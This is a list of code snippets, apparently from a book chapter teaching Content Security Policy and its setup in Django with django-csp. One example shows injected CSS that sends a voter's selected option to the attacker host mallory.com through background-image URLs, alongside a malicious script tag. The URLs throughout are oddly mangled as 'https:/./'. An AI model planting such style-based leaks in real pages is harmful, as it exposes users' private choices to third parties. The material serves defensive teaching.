["```py\nContent-Security-Policy: script-src 'none' https:\n```", "```py\n<script src=\"https:/./mallory.com/malicious.js\"></script>\n```", "```py\nContent-Security-Policy: default-src 'self'\n```", "```py\nContent-Security-Policy: script-src 'nonce-EKpb5h6TajmKa5pK'\n```", "```py\n<script nonce='EKpb5h6TajmKa5pK'>\n   /* inline script */\n</script>\n```", "```py\n<html>\n\n    <style>                                                    \u2776\n        option[value=bob]:checked {                            \u2777\n            background: url(https://mallory.com/?vote=bob);    \u2778\n        }\n        option[value=eve]:checked {                            \u2779\n            background: url(https://mallory.com/?vote=eve);    \u277a\n        }\n    </style>\n\n    <body>\n        ...\n        <select id=\"ballot\">\n            <option>Cast your vote!</option>\n            <option value=\"bob\">Bob</option>                   \u277b\n            <option value=\"eve\">Eve</option>                   \u277b\n        </select>\n        ...\n    </body>\n\n</html>\n```", "```py\nContent-Security-Policy: style-src 'nonce-EKpb5h6TajmKa5pK'\n```", "```py\n<style nonce='EKpb5h6TajmKa5pK'>\n   body {\n       font-size: 42;\n   }\n</style>\n```", "```py\nContent-Security-Policy: img-src https:/./cdn.charlie.com\n```", "```py\nContent-Security-Policy: img-src https:/./*.alice.com:8000\n\u27a5                               https:/./bob.com:*\n\u27a5                               charlie.com\n\u27a5                               http:/./163.172.16.173\n```", "```py\n$ pipenv install django-csp\n```", "```py\nMIDDLEWARE = [\n   ...\n   'csp.middleware.CSPMiddleware',\n   ...\n]\n```", "```py\nCSP_DEFAULT_SRC = (\"'self'\", )\n```", "```py\nCSP_INCLUDE_NONCE_IN = ['script-src', 'style-src', ]\n```", "```py\n<script nonce='{{request.csp_nonce}}'>   \u2776\n   /* inline script */\n</script>\n\n<style nonce='{{request.csp_nonce}}'>    \u2776\n   body {\n       font-size: 42;\n   }\n</style>\n```", "```py\nCSP_SCRIPT_SRC = (\"'self'\", )\nCSP_STYLE_SRC = (\"'self'\", )\n```", "```py\nCSP_IMG_SRC = (\"'self'\", 'https:/./cdn.charlie.com', )\n```", "```py\nCSP_FORM_ACTION = (\"'self'\", )\nCSP_FRAME_ANCESTORS = (\"'none'\", )\n```", "```py\n>>> import requests\n>>> \n>>> url = 'https:/./localhost:8000/template_with_a_nonce/'    \u2776\n>>> response = requests.get(url, verify=False)               \u2776\n>>> \n>>> header = response.headers['Content-Security-Policy']     \u2777\n>>> directives = header.split(';')                           \u2778\n>>> for directive in directives:                             \u2778\n...     print(directive)                                     \u2778\n... \n default-src 'self'\n script-src 'self' 'nonce-Nry4fgCtYFIoHK9jWY2Uvg=='\n style-src 'self' 'nonce-Nry4fgCtYFIoHK9jWY2Uvg=='\n img-src 'self' https:/./cdn.charlie.com\n form-action 'self'\n frame-ancestors 'none'\n```", "```py\n<html>\n  <head>\n    <link href='https://fonts.googleapis.com/css?family=Caveat'    \u2776\n          rel='stylesheet'>                                        \u2776\n    <style nonce=\"{{request.csp_nonce}}\">                          \u2777\n      body {                                                       \u2777\n        font-family: 'Caveat', serif;                              \u2777\n      }                                                            \u2777\n    </style>                                                       \u2777\n  </head>\n    <body>\n      Text displayed in Caveat font\n    </body>\n</html>\n```", "```py\nfrom csp.decorators import csp_update\n\ndecorator = csp_update(                          \u2776\n STYLE_SRC='https:/./fonts.googleapis.com',    \u2776\n FONT_SRC='https:/./fonts.gstatic.com')        \u2776\n\n@method_decorator(decorator, name='dispatch')    \u2777\nclass CspUpdateView(View):\n    def get(self, request):\n        ...\n        return render(request, 'csp_update.html')\n```", "```py\nfrom csp.decorators import csp_replace\n\ndecorator = csp_replace(SCRIPT_SRC=\"'none'\")     \u2776\n\n@method_decorator(decorator, name='dispatch')    \u2777\nclass CspReplaceView(View):\n    def get(self, request):\n        ...\n        return render(request, 'csp_replace.html')\n```", "```py\nfrom csp.decorators import csp\n\n@method_decorator(csp(DEFAULT_SRC=\"'self'\"), name='dispatch')     \u2776\nclass CspView(View):\n    def get(self, request):\n        ...\n        return render(request, 'csp.html')\n```", "```py\nfrom csp.decorators import csp_exempt\n\n@method_decorator(csp_exempt, name='dispatch')     \u2776\nclass CspExemptView(View):\n    def get(self, request):\n        ...\n        return render(request, 'csp_exempt.html')\n```", "```py\nCSP_EXCLUDE_URL_PREFIXES = ('/without_csp/', '/missing_csp/', )\n```", "```py\nContent-Security-Policy: default-src 'self'; report-uri /csp_report/\n```", "```py\nCSP_REPORT_URI = ('/csp_report/', )\n```", "```py\nCSP_REPORT_URI = ('https:/./alice.httpschecker.net/report',\n                  'https:/./alice.report-uri.com/r/d/csp/enforce')\n```", "```py\n{\n  \"csp-report\": {\n \"document-uri\": \"https:/./alice.com/report_example/\",\n    \"violated-directive\": \"img-src\",\n    \"effective-directive\": \"img-src\",\n    \"original-policy\": \"default-src 'self'; report-uri /csp_report/\",\n    \"disposition\": \"enforce\",\n \"blocked-uri\": \"https:/./mallory.com/malicious.svg\",\n    \"status-code\": 0,\n  }\n}\n```", "```py\nCSP_REPORT_PERCENTAGE = 0.42\n```", "```py\nMIDDLEWARE = [\n    ...\n    # 'csp.middleware.CSPMiddleware',                        \u2776\n    'csp.contrib.rate_limiting.RateLimitedCSPMiddleware',    \u2777\n    ...\n]\n```", "```py\nContent-Security-Policy-Report-Only: ... ; report-uri /csp_report/\n```", "```py\nCSP_REPORT_ONLY = True\n```", "```py\nContent-Security-Policy: upgrade-insecure-requests\n```", "```py\nCSP_UPGRADE_INSECURE_REQUESTS = True\n```", "```py\nContent-Security-Policy: block-all-mixed-content\n```", "```py\nCSP_BLOCK_ALL_MIXED_CONTENT = True\n```"]